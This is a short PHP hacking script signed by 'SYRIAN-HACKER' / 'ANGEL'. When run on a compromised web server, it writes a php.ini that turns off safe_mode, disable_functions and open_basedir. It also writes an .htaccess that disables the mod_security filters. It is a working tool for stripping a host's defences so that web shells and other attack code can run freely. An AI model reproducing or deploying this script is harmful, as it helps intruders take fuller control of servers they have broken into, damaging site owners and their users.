<?
// Coded By SYRIAN-HACKER
echo "<html>
<center><br>
<head>
<title> ANGEL </title>
<meta http-equiv='pragma' content='no-cache'>
</head><body>";

$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off   
disable_functions =
safe_mode_gid = OFF
open_basedir = OFF ");

$fp2 = fopen(".htaccess","w+");
fwrite($fp2,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule> ");
echo "<BR>Coded By<BR>ANGEL<BR>";
?>